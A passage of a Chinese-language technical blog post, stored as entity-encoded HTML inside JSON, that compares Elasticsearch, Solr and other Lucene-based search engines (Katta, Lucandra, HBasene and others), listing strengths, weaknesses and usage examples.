Elasticsearch&#x3002;</li>\n<li>Solr &#x662F;&#x4F20;&#x7EDF;&#x641C;&#x7D22;&#x5E94;&#x7528;&#x7684;&#x6709;&#x529B;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x4F46; Elasticsearch &#x66F4;&#x9002;&#x7528;&#x4E8E;&#x65B0;&#x5174;&#x7684;&#x5B9E;&#x65F6;&#x641C;&#x7D22;&#x5E94;&#x7528;&#x3002;</li>\n</ul>\n<hr>\n<h2 id=\"&#x5176;&#x4ED6;&#x57FA;&#x4E8E;Lucene&#x7684;&#x5F00;&#x6E90;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x89E3;&#x51B3;&#x65B9;&#x6848;\"><a href=\"#&#x5176;&#x4ED6;&#x57FA;&#x4E8E;Lucene&#x7684;&#x5F00;&#x6E90;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x89E3;&#x51B3;&#x65B9;&#x6848;\" class=\"headerlink\" title=\"&#x5176;&#x4ED6;&#x57FA;&#x4E8E;Lucene&#x7684;&#x5F00;&#x6E90;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x89E3;&#x51B3;&#x65B9;&#x6848;\"></a>&#x5176;&#x4ED6;&#x57FA;&#x4E8E;Lucene&#x7684;&#x5F00;&#x6E90;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x89E3;&#x51B3;&#x65B9;&#x6848;</h2><h4 id=\"Lucene\"><a href=\"#Lucene\" class=\"headerlink\" title=\"Lucene\"></a>Lucene</h4><p>&#x8BF4;&#x660E;&#xFF1A;Lucene &#x662F;&#x4E00;&#x4E2A; JAVA &#x641C;&#x7D22;&#x7C7B;&#x5E93;&#xFF0C;&#x5B83;&#x672C;&#x8EAB;&#x5E76;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x9700;&#x8981;&#x989D;&#x5916;&#x7684;&#x5F00;&#x53D1;&#x5DE5;&#x4F5C;&#x3002;<br>&#x4F18;&#x70B9;&#xFF1A;&#x6210;&#x719F;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x6709;&#x5F88;&#x591A;&#x7684;&#x6210;&#x529F;&#x6848;&#x4F8B;&#x3002;apache &#x9876;&#x7EA7;&#x9879;&#x76EE;&#xFF0C;&#x6B63;&#x5728;&#x6301;&#x7EED;&#x5FEB;&#x901F;&#x7684;&#x8FDB;&#x6B65;&#x3002;&#x5E9E;&#x5927;&#x800C;&#x6D3B;&#x8DC3;&#x7684;&#x5F00;&#x53D1;&#x793E;&#x533A;&#xFF0C;&#x5927;&#x91CF;&#x7684;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x3002;&#x5B83;&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x7C7B;&#x5E93;&#xFF0C;&#x6709;&#x8DB3;&#x591F;&#x7684;&#x5B9A;&#x5236;&#x548C;&#x4F18;&#x5316;&#x7A7A;&#x95F4;&#xFF1A;&#x7ECF;&#x8FC7;&#x7B80;&#x5355;&#x5B9A;&#x5236;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x6EE1;&#x8DB3;&#x7EDD;&#x5927;&#x90E8;&#x5206;&#x5E38;&#x89C1;&#x7684;&#x9700;&#x6C42;&#xFF1B;&#x7ECF;&#x8FC7;&#x4F18;&#x5316;&#xFF0C;&#x53EF;&#x4EE5;&#x652F;&#x6301; 10&#x4EBF;+ &#x91CF;&#x7EA7;&#x7684;&#x641C;&#x7D22;&#x3002;<br>&#x7F3A;&#x70B9;&#xFF1A;&#x9700;&#x8981;&#x989D;&#x5916;&#x7684;&#x5F00;&#x53D1;&#x5DE5;&#x4F5C;&#x3002;&#x6240;&#x6709;&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x53EF;&#x9760;&#x6027;&#x7B49;&#x90FD;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#xFF1B;&#x975E;&#x5B9E;&#x65F6;&#xFF0C;&#x4ECE;&#x5EFA;&#x7D22;&#x5F15;&#x5230;&#x53EF;&#x4EE5;&#x641C;&#x7D22;&#x4E2D;&#x95F4;&#x6709;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x5EF6;&#x8FDF;&#xFF0C;&#x800C;&#x5F53;&#x524D;&#x7684;&#x201C;&#x8FD1;&#x5B9E;&#x65F6;&#x201D;(Lucene Near Real Time search)&#x641C;&#x7D22;&#x65B9;&#x6848;&#x7684;&#x53EF;&#x6269;&#x5C55;&#x6027;&#x6709;&#x5F85;&#x8FDB;&#x4E00;&#x6B65;&#x5B8C;&#x5584;</p>\n<h4 id=\"Katta\"><a href=\"#Katta\" class=\"headerlink\" title=\"Katta\"></a>Katta</h4><p>&#x8BF4;&#x660E;&#xFF1A;&#x57FA;&#x4E8E; Lucene &#x7684;&#xFF0C;&#x652F;&#x6301;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x53EF;&#x6269;&#x5C55;&#xFF0C;&#x5177;&#x6709;&#x5BB9;&#x9519;&#x529F;&#x80FD;&#xFF0C;&#x51C6;&#x5B9E;&#x65F6;&#x7684;&#x641C;&#x7D22;&#x65B9;&#x6848;&#x3002;<br>&#x4F18;&#x70B9;&#xFF1A;&#x5F00;&#x7BB1;&#x5373;&#x7528;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0E; Hadoop &#x914D;&#x5408;&#x5B9E;&#x73B0;&#x5206;&#x5E03;&#x5F0F;&#x3002;&#x5177;&#x5907;&#x6269;&#x5C55;&#x548C;&#x5BB9;&#x9519;&#x673A;&#x5236;&#x3002;<br>&#x7F3A;&#x70B9;&#xFF1A;&#x53EA;&#x662F;&#x641C;&#x7D22;&#x65B9;&#x6848;&#xFF0C;&#x5EFA;&#x7D22;&#x5F15;&#x90E8;&#x5206;&#x8FD8;&#x662F;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#x3002;&#x5728;&#x641C;&#x7D22;&#x529F;&#x80FD;&#x4E0A;&#xFF0C;&#x53EA;&#x5B9E;&#x73B0;&#x4E86;&#x6700;&#x57FA;&#x672C;&#x7684;&#x9700;&#x6C42;&#x3002;&#x6210;&#x529F;&#x6848;&#x4F8B;&#x8F83;&#x5C11;&#xFF0C;&#x9879;&#x76EE;&#x7684;&#x6210;&#x719F;&#x5EA6;&#x7A0D;&#x5FAE;&#x5DEE;&#x4E00;&#x4E9B;&#x3002;&#x56E0;&#x4E3A;&#x9700;&#x8981;&#x652F;&#x6301;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E9B;&#x590D;&#x6742;&#x7684;&#x67E5;&#x8BE2;&#x9700;&#x6C42;&#xFF0C;&#x5B9A;&#x5236;&#x7684;&#x96BE;&#x5EA6;&#x4F1A;&#x6BD4;&#x8F83;&#x5927;&#x3002;</p>\n<h4 id=\"Hadoop-contrib-index\"><a href=\"#Hadoop-contrib-index\" class=\"headerlink\" title=\"Hadoop contrib/index\"></a>Hadoop contrib/index</h4><p>&#x8BF4;&#x660E;&#xFF1A;Map/Reduce &#x6A21;&#x5F0F;&#x7684;&#xFF0C;&#x5206;&#x5E03;&#x5F0F;&#x5EFA;&#x7D22;&#x5F15;&#x65B9;&#x6848;&#xFF0C;&#x53EF;&#x4EE5;&#x8DDF; Katta &#x914D;&#x5408;&#x4F7F;&#x7528;&#x3002;<br>&#x4F18;&#x70B9;&#xFF1A;&#x5206;&#x5E03;&#x5F0F;&#x5EFA;&#x7D22;&#x5F15;&#xFF0C;&#x5177;&#x5907;&#x53EF;&#x6269;&#x5C55;&#x6027;&#x3002;<br>&#x7F3A;&#x70B9;&#xFF1A;&#x53EA;&#x662F;&#x5EFA;&#x7D22;&#x5F15;&#x65B9;&#x6848;&#xFF0C;&#x4E0D;&#x5305;&#x62EC;&#x641C;&#x7D22;&#x5B9E;&#x73B0;&#x3002;&#x5DE5;&#x4F5C;&#x5728;&#x6279;&#x5904;&#x7406;&#x6A21;&#x5F0F;&#xFF0C;&#x5BF9;&#x5B9E;&#x65F6;&#x641C;&#x7D22;&#x7684;&#x652F;&#x6301;&#x4E0D;&#x4F73;&#x3002;</p>\n<h4 id=\"LinkedIn-&#x7684;&#x5F00;&#x6E90;&#x65B9;&#x6848;\"><a href=\"#LinkedIn-&#x7684;&#x5F00;&#x6E90;&#x65B9;&#x6848;\" class=\"headerlink\" title=\"LinkedIn &#x7684;&#x5F00;&#x6E90;&#x65B9;&#x6848;\"></a>LinkedIn &#x7684;&#x5F00;&#x6E90;&#x65B9;&#x6848;</h4><p>&#x8BF4;&#x660E;&#xFF1A;&#x57FA;&#x4E8E; Lucene &#x7684;&#x4E00;&#x7CFB;&#x5217;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x5305;&#x62EC; &#x51C6;&#x5B9E;&#x65F6;&#x641C;&#x7D22; zoie &#xFF0C;facet &#x641C;&#x7D22;&#x5B9E;&#x73B0; bobo &#xFF0C;&#x673A;&#x5668;&#x5B66;&#x4E60;&#x7B97;&#x6CD5; decomposer &#xFF0C;&#x6458;&#x8981;&#x5B58;&#x50A8;&#x5E93; krati &#xFF0C;&#x6570;&#x636E;&#x5E93;&#x6A21;&#x5F0F;&#x5305;&#x88C5; sensei &#x7B49;&#x7B49;<br>&#x4F18;&#x70B9;&#xFF1A;&#x7ECF;&#x8FC7;&#x9A8C;&#x8BC1;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x652F;&#x6301;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x53EF;&#x6269;&#x5C55;&#xFF0C;&#x4E30;&#x5BCC;&#x7684;&#x529F;&#x80FD;&#x5B9E;&#x73B0;<br>&#x7F3A;&#x70B9;&#xFF1A;&#x4E0E; linkedin &#x516C;&#x53F8;&#x7684;&#x8054;&#x7CFB;&#x592A;&#x7D27;&#x5BC6;&#xFF0C;&#x53EF;&#x5B9A;&#x5236;&#x6027;&#x6BD4;&#x8F83;&#x5DEE;</p>\n<h4 id=\"Lucandra\"><a href=\"#Lucandra\" class=\"headerlink\" title=\"Lucandra\"></a>Lucandra</h4><p>&#x8BF4;&#x660E;&#xFF1A;&#x57FA;&#x4E8E; Lucene&#xFF0C;&#x7D22;&#x5F15;&#x5B58;&#x5728; cassandra &#x6570;&#x636E;&#x5E93;&#x4E2D;<br>&#x4F18;&#x70B9;&#xFF1A;&#x53C2;&#x8003; cassandra &#x7684;&#x4F18;&#x70B9;<br>&#x7F3A;&#x70B9;&#xFF1A;&#x53C2;&#x8003; cassandra &#x7684;&#x7F3A;&#x70B9;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x8FD9;&#x53EA;&#x662F;&#x4E00;&#x4E2A; demo&#xFF0C;&#x6CA1;&#x6709;&#x7ECF;&#x8FC7;&#x5927;&#x91CF;&#x9A8C;&#x8BC1;</p>\n<h4 id=\"HBasene\"><a href=\"#HBasene\" class=\"headerlink\" title=\"HBasene\"></a>HBasene</h4><p>&#x8BF4;&#x660E;&#xFF1A;&#x57FA;&#x4E8E; Lucene&#xFF0C;&#x7D22;&#x5F15;&#x5B58;&#x5728; HBase &#x6570;&#x636E;&#x5E93;&#x4E2D;<br>&#x4F18;&#x70B9;&#xFF1A;&#x53C2;&#x8003; HBase &#x7684;&#x4F18;&#x70B9;<br>&#x7F3A;&#x70B9;&#xFF1A;&#x53C2;&#x8003; HBase &#x7684;&#x7F3A;&#x70B9;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x5728;&#x5B9E;&#x73B0;&#x4E2D;&#xFF0C;lucene terms &#x662F;&#x5B58;&#x6210;&#x884C;&#xFF0C;&#x4F46;&#x6BCF;&#x4E2A; term &#x5BF9;&#x5E94;&#x7684; posting lists &#x662F;&#x4EE5;&#x5217;&#x7684;&#x65B9;&#x5F0F;&#x5B58;&#x50A8;&#x7684;&#x3002;&#x968F;&#x7740;&#x5355;&#x4E2A; term &#x7684; posting lists &#x7684;&#x589E;&#x5927;&#xFF0C;&#x67E5;&#x8BE2;&#x65F6;&#x7684;&#x901F;&#x5EA6;&#x53D7;&#x5230;&#x7684;&#x5F71;&#x54CD;&#x4F1A;&#x975E;&#x5E38;&#x5927;</p>\n","excerpt":"<blockquote>\n<p>&#x516C;&#x53F8;&#x4E4B;&#x524D;&#x6709;&#x4E2A;&#x7528;Lucene&#x5B9E;&#x73B0;&#x7684;&#x4F2A;&#x5206;&#x5E03;&#x5F0F;&#x9879;&#x76EE;&#xFF0C;&#x5B9E;&#x65F6;&#x6027;&#x5F88;&#x5DEE;&#xFF0C;&#x540E;&#x671F;&#x6570;&#x636E;&#x91CF;&#x9010;&#x6E10;&#x589E;&#x5927;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6570;&#x636E;&#x540C;&#x6B65;&#x4E00;&#x6B21;&#x9700;&#x8981;&#x5341;&#x51E0;&#x5C0F;&#x65F6;&#x3002;&#x5F53;&#x65F6;&#x9879;&#x76EE;&#x91CD;&#x6784;&#x8003;&#x8651;&#x5230;&#x7684;&#x662F;Solr&#x548C;ES&#xFF0C;&#x6211;&#x53C2;&#x4E0E;&#x7684;&#x662F;Solr&#x6280;&#x672F;&#x7684;&#x9884;&#x7814;&#x3002;&#x56E0;&#x4E3A;&#x9879;&#x76EE;&#x5B9E;&#x65F6;&#x6027;&#x8981;&#x6C42;&#x5F88;&#x9AD8;&#xFF0C;&#x6700;&#x7EC8;&#x9009;&#x62E9;&#x7684;&#x662F;ES&#x3002;</p>\n</blockquote>\n<h2 id=\"Elasticsearch\"><a href=\"#Elasticsearch\" class=\"headerlink\" title=\"Elasticsearch\"></a>Elasticsearch</h2><h4 id=\"&#x7B80;&#x4ECB;\"><a href=\"#&#x7B80;&#x4ECB;\" class=\"headerlink\" title=\"&#x7B80;&#x4ECB;\"></a>&#x7B80;&#x4ECB;</h4><p>Elasticsearch&#x662F;&#x4E00;&#x4E2A;&#x5B9E;&#x65F6;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x641C;&#x7D22;&#x548C;&#x5206;&#x6790;&#x5F15;&#x64CE;&#x3002;&#x5B83;&#x53EF;&#x4EE5;&#x5E2E;&#x52A9;&#x4F60;&#x7528;&#x524D;&#x6240;&#x672A;&#x6709;&#x7684;&#x901F;&#x5EA6;&#x53BB;&#x5904;&#x7406;&#x5927;&#x89C4;&#x6A21;&#x6570;&#x636E;&#x3002;&#x5B83;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x5168;&#x6587;&#x641C;&#x7D22;&#xFF0C;&#x7ED3;&#x6784;&#x5316;&#x641C;&#x7D22;&#x4EE5;&#x53CA;&#x5206;&#x6790;&#xFF0C;&#x5F53;&#x7136;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x5C06;&#x8FD9;&#x4E09;&#x8005;&#x8FDB;&#x884C;&#x7EC4;&#x5408;&#x3002;</p>\n<p>Elasticsearch&#x662F;&#x4E00;&#x4E2A;&#x5EFA;&#x7ACB;&#x5728;&#x5168;&#x6587;&#x641C;&#x7D22;&#x5F15;&#x64CE; Apache Lucene&#x2122; &#x57FA;&#x7840;&#x4E0A;&#x7684;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF4;Lucene&#x662F;&#x5F53;&#x4ECA;&#x6700;&#x5148;&#x8FDB;&#xFF0C;&#x6700;&#x9AD8;&#x6548;&#x7684;&#x5168;&#x529F;&#x80FD;&#x5F00;&#x6E90;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x6846;&#x67B6;&#x3002;&#x4F46;&#x662F;Lucene&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x6846;&#x67B6;&#xFF0C;&#x8981;&#x5145;&#x5206;&#x5229;&#x7528;&#x5B83;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;JAVA&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x7A0B;&#x5E8F;&#x4E2D;&#x96C6;&#x6210;Lucene&#x3002;&#x9700;&#x8981;&#x5F88;&#x591A;&#x7684;&#x5B66;&#x4E60;&#x4E86;&#x89E3;&#xFF0C;&#x624D;&#x80FD;&#x660E;&#x767D;&#x5B83;&#x662F;&#x5982;&#x4F55;&#x8FD0;&#x884C;&#x7684;&#xFF0C;Lucene&#x786E;&#x5B9E;&#x975E;&#x5E38;&#x590D;&#x6742;&#x3002;</p>\n<p>Elasticsearch&#x4F7F;&#x7528;Lucene&#x4F5C;&#x4E3A;&#x5185;&#x90E8;&#x5F15;&#x64CE;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x4F7F;&#x7528;&#x5B83;&#x505A;&#x5168;&#x6587;&#x641C;&#x7D22;&#x65F6;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x7EDF;&#x4E00;&#x5F00;&#x53D1;&#x597D;&#x7684;API&#x5373;&#x53EF;&#xFF0C;&#x800C;&#x4E0D;&#x9700;&#x8981;&#x4E86;&#x89E3;&#x5176;&#x80CC;&#x540E;&#x590D;&#x6742;&#x7684;Lucene&#x7684;&#x8FD0;&#x884C;&#x539F;&#x7406;&#x3002;</p>","more":"<p>&#x5F53;&#x7136;Elasticsearch&#x5E76;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F;Lucene&#x8FD9;&#x4E48;&#x7B80;&#x5355;&#xFF0C;&#x5B83;&#x4E0D;&#x4F46;&#x5305;&#x62EC;&#x4E86;&#x5168;&#x6587;&#x641C;&#x7D22;&#x529F;&#x80FD;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x4EE5;&#x4E0B;&#x5DE5;&#x4F5C;:<br>1&#x3001;&#x5206;&#x5E03;&#x5F0F;&#x5B9E;&#x65F6;&#x6587;&#x4EF6;&#x5B58;&#x50A8;&#xFF0C;&#x5E76;&#x5C06;&#x6BCF;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#x90FD;&#x7F16;&#x5165;&#x7D22;&#x5F15;&#xFF0C;&#x4F7F;&#x5176;&#x53EF;&#x4EE5;&#x88AB;&#x641C;&#x7D22;&#x3002;<br>2&#x3001;&#x5B9E;&#x65F6;&#x5206;&#x6790;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x3002;<br>3&#x3001;&#x53EF;&#x4EE5;&#x6269;&#x5C55;&#x5230;&#x4E0A;&#x767E;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5904;&#x7406;PB&#x7EA7;&#x522B;&#x7684;&#x7ED3;&#x6784;&#x5316;&#x6216;&#x975E;&#x7ED3;&#x6784;&#x5316;&#x6570;&#x636E;&#x3002;</p>\n<p>&#x8FD9;&#x4E48;&#x591A;&#x7684;&#x529F;&#x80FD;&#x88AB;&#x96C6;&#x6210;&#x5230;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x8F7B;&#x677E;&#x5730;&#x901A;&#x8FC7;&#x5BA2;&#x6237;&#x7AEF;&#x6216;&#x8005;&#x4EFB;&#x4F55;&#x4F60;&#x559C;&#x6B22;&#x7684;&#x7A0B;&#x5E8F;&#x8BED;&#x8A00;&#x4E0E;ES&#x7684;RESTful API&#x8FDB;&#x884C;&#x4EA4;&#x6D41;&#x3002;Elasticsearch&#x7684;&#x4E0A;&#x624B;&#x662F;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x7684;&#x3002;&#x5B83;&#x9644;&#x5E26;&#x4E86;&#x5F88;&#x591A;&#x975E;&#x5E38;&#x5408;&#x7406;&#x7684;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x8FD9;&#x8BA9;&#x521D;&#x5B66;&#x8005;&#x5F88;&#x597D;&#x5730;&#x907F;&#x514D;&#x4E00;&#x4E0A;&#x624B;&#x5C31;&#x8981;&#x9762;&#x5BF9;&#x590D;&#x6742;&#x7684;&#x7406;&#x8BBA;&#xFF0C;&#x5B83;&#x5B89;&#x88C5;&#x597D;&#x4E86;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E86;&#xFF0C;&#x7528;&#x5F88;&#x5C0F;&#x7684;&#x5B66;&#x4E60;&#x6210;&#x672C;&#x5C31;&#x53EF;&#x4EE5;&#x53D8;&#x5F97;&#x5F88;&#x6709;&#x751F;&#x4EA7;&#x529B;&#x3002;</p>\n<p>&#x968F;&#x7740;&#x8D8A;&#x5B66;&#x8D8A;&#x6DF1;&#x5165;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;Elasticsearch&#x66F4;&#x591A;&#x9AD8;&#x7EA7;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x6574;&#x4E2A;&#x5F15;&#x64CE;&#x53EF;&#x4EE5;&#x5F88;&#x7075;&#x6D3B;&#x5730;&#x8FDB;&#x884C;&#x914D;&#x7F6E;&#x3002;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x81EA;&#x8EAB;&#x9700;&#x6C42;&#x6765;&#x5B9A;&#x5236;&#x5C5E;&#x4E8E;&#x81EA;&#x5DF1;&#x7684;Elasticsearch&#x3002;</p>\n<p>&#x4F7F;&#x7528;&#x6848;&#x4F8B;&#xFF1A;<br>1&#x3001;&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x4F7F;&#x7528;Elasticsearch&#x6765;&#x8FDB;&#x884C;&#x5168;&#x6587;&#x641C;&#x505A;&#x5E76;&#x9AD8;&#x4EAE;&#x663E;&#x793A;&#x5173;&#x952E;&#x8BCD;&#xFF0C;&#x4EE5;&#x53CA;&#x63D0;&#x4F9B;search-as-you-type&#x3001;did-you-mean&#x7B49;&#x641C;&#x7D22;&#x5EFA;&#x8BAE;&#x529F;&#x80FD;&#x3002;<br>2&#x3001;&#x82F1;&#x56FD;&#x536B;&#x62A5;&#x4F7F;&#x7528;Elasticsearch&#x6765;&#x5904;&#x7406;&#x8BBF;&#x5BA2;&#x65E5;&#x5FD7;&#xFF0C;&#x4EE5;&#x4FBF;&#x80FD;&#x5C06;&#x516C;&#x4F17;&#x5BF9;&#x4E0D;&#x540C;&#x6587;&#x7AE0;&#x7684;&#x53CD;&#x5E94;&#x5B9E;&#x65F6;&#x5730;&#x53CD;&#x9988;&#x7ED9;&#x5404;&#x4F4D;&#x7F16;&#x8F91;&#x3002;<br>3&#x3001;StackOverflow&#x5C06;&#x5168;&#x6587;&#x641C;&#x7D22;&#x4E0E;&#x5730;&#x7406;&#x4F4D;&#x7F6E;&#x548C;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x8FDB;&#x884C;&#x7ED3;&#x5408;&#xFF0C;&#x4EE5;&#x63D0;&#x4F9B;more-like-this&#x76F8;&#x5173;&#x95EE;&#x9898;&#x7684;&#x5C55;&#x73B0;&#x3002;<br>4&#x3001;GitHub&#x4F7F;&#x7528;Elasticsearch&#x6765;&#x68C0;&#x7D22;&#x8D85;&#x8FC7;1300&#x4EBF;&#x884C;&#x4EE3;&#x7801;&#x3002;<br>5&#x3001;&#x6BCF;&#x5929;&#xFF0C;Goldman Sachs&#x4F7F;&#x7528;&#x5B83;&#x6765;&#x5904;&#x7406;5TB&#x6570;&#x636E;&#x7684;&#x7D22;&#x5F15;&#xFF0C;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x6295;&#x884C;&#x4F7F;&#x7528;&#x5B83;&#x6765;&#x5206;&#x6790;&#x80A1;&#x7968;&#x5E02;&#x573A;&#x7684;&#x53D8;&#x52A8;&#x3002;<br>&#x4F46;&#x662F;Elasticsearch&#x5E76;&#x4E0D;&#x53EA;&#x662F;&#x9762;&#x5411;&#x5927;&#x578B;&#x4F01;&#x4E1A;&#x7684;&#xFF0C;&#x5B83;&#x8FD8;&#x5E2E;&#x52A9;&#x4E86;&#x5F88;&#x591A;&#x7C7B;&#x4F3C;DataDog&#x4EE5;&#x53CA;Klout&#x7684;&#x521B;&#x4E1A;&#x516C;&#x53F8;&#x8FDB;&#x884C;&#x4E86;&#x529F;&#x80FD;&#x7684;&#x6269;&#x5C55;&#x3002;</p>\n<h4 id=\"&#x4F18;&#x70B9;\"><a href=\"#&#x4F18;&#x70B9;\" class=\"headerlink\" title=\"&#x4F18;&#x70B9;\"></a>&#x4F18;&#x70B9;</h4><ul>\n<li>Elasticsearch&#x662F;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x3002;&#x4E0D;&#x9700;&#x8981;&#x5176;&#x4ED6;&#x7EC4;&#x4EF6;&#xFF0C;&#x5206;&#x53D1;&#x662F;&#x5B9E;&#x65F6;&#x7684;&#xFF0C;&#x88AB;&#x53EB;&#x505A;&#x201D;Push replication&#x201D;&#x3002;</li>\n<li>Elasticsearch &#x5B8C;&#x5168;&#x652F;&#x6301; Apache Lucene &#x7684;&#x63A5;&#x8FD1;&#x5B9E;&#x65F6;&#x7684;&#x641C;&#x7D22;&#x3002;</li>\n<li>&#x5904;&#x7406;&#x591A;&#x79DF;&#x6237;&#xFF08;multitenancy&#xFF09;&#x4E0D;&#x9700;&#x8981;&#x7279;&#x6B8A;&#x914D;&#x7F6E;&#xFF0C;&#x800C;Solr&#x5219;&#x9700;&#x8981;&#x66F4;&#x591A;&#x7684;&#x9AD8;&#x7EA7;&#x8BBE;&#x7F6E;&#x3002;</li>\n<li>Elasticsearch &#x91C7;&#x7528; Gateway &#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x4F7F;&#x5F97;&#x5B8C;&#x5907;&#x4EFD;&#x66F4;&#x52A0;&#x7B80;&#x5355;&#x3002;</li>\n<li>&#x5404;&#x8282;&#x70B9;&#x7EC4;&#x6210;&#x5BF9;&#x7B49;&#x7684;&#x7F51;&#x7EDC;&#x7ED3;&#x6784;&#xFF0C;&#x67D0;&#x4E9B;&#x8282;&#x70B9;&#x51FA;&#x73B0;&#x6545;&#x969C;&#x65F6;&#x4F1A;&#x81EA;&#x52A8;&#x5206;&#x914D;&#x5176;&#x4ED6;&#x8282;&#x70B9;&#x4EE3;&#x66FF;&#x5176;&#x8FDB;&#x884C;&#x5DE5;&#x4F5C;&#x3002;</li>\n</ul>\n<h4 id=\"&#x7F3A;&#x70B9;\"><a href=\"#&#x7F3A;&#x70B9;\" class=\"headerlink\" title=\"&#x7F3A;&#x70B9;\"></a>&#x7F3A;&#x70B9;</h4><ul>\n<li>&#x53EA;&#x6709;&#x4E00;&#x540D;&#x5F00;&#x53D1;&#x8005;&#xFF08;&#x5F53;&#x524D;Elasticsearch GitHub&#x7EC4;&#x7EC7;&#x5DF2;&#x7ECF;&#x4E0D;&#x53EA;&#x5982;&#x6B64;&#xFF0C;&#x5DF2;&#x7ECF;&#x6709;&#x4E86;&#x76F8;&#x5F53;&#x6D3B;&#x8DC3;&#x7684;&#x7EF4;&#x62A4;&#x8005;&#xFF09;</li>\n<li>&#x8FD8;&#x4E0D;&#x591F;&#x81EA;&#x52A8;&#xFF08;&#x4E0D;&#x9002;&#x5408;&#x5F53;&#x524D;&#x65B0;&#x7684;Index Warmup API&#xFF09;</li>\n</ul>\n<hr>\n<h2 id=\"Solr\"><a href=\"#Solr\" class=\"headerlink\" title=\"Solr\"></a>Solr</h2><h4 id=\"&#x7B80;&#x4ECB;-1\"><a href=\"#&#x7B80;&#x4ECB;-1\" class=\"headerlink\" title=\"&#x7B80;&#x4ECB;\"></a>&#x7B80;&#x4ECB;</h4><p>Solr&#xFF08;&#x8BFB;&#x4F5C;&#x201C;solar&#x201D;&#xFF09;&#x662F;Apache Lucene&#x9879;&#x76EE;&#x7684;&#x5F00;&#x6E90;&#x4F01;&#x4E1A;&#x641C;&#x7D22;&#x5E73;&#x53F0;&#x3002;<br>&#x5176;&#x4E3B;&#x8981;&#x529F;&#x80FD;&#x5305;&#x62EC;&#x5168;&#x6587;&#x68C0;&#x7D22;&#x3001;&#x547D;&#x4E2D;&#x6807;&#x793A;&#x3001;&#x5206;&#x9762;&#x641C;&#x7D22;&#x3001;&#x52A8;&#x6001;&#x805A;&#x7C7B;&#x3001;&#x6570;&#x636E;&#x5E93;&#x96C6;&#x6210;&#xFF0C;&#x4EE5;&#x53CA;&#x5BCC;&#x6587;&#x672C;&#xFF08;&#x5982;Word&#x3001;PDF&#xFF09;&#x7684;&#x5904;&#x7406;&#x3002;<br>Solr&#x662F;&#x9AD8;&#x5EA6;&#x53EF;&#x6269;&#x5C55;&#x7684;&#xFF0C;&#x5E76;&#x63D0;&#x4F9B;&#x4E86;&#x5206;&#x5E03;&#x5F0F;&#x641C;&#x7D22;&#x548C;&#x7D22;&#x5F15;&#x590D;&#x5236;&#x3002;<br>Solr&#x662F;&#x6700;&#x6D41;&#x884C;&#x7684;&#x4F01;&#x4E1A;&#x7EA7;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#xFF0C;Solr4 &#x8FD8;&#x589E;&#x52A0;&#x4E86;NoSQL&#x652F;&#x6301;&#x3002;<br>Solr&#x662F;&#x7528;Java&#x7F16;&#x5199;&#x3001;&#x8FD0;&#x884C;&#x5728;Servlet&#x5BB9;&#x5668;&#xFF08;&#x5982; Apache Tomcat &#x6216;Jetty&#xFF09;&#x7684;&#x4E00;&#x4E2A;&#x72EC;&#x7ACB;&#x7684;&#x5168;&#x6587;&#x641C;&#x7D22;&#x670D;&#x52A1;&#x5668;&#x3002;<br>Solr&#x91C7;&#x7528;&#x4E86; Lucene 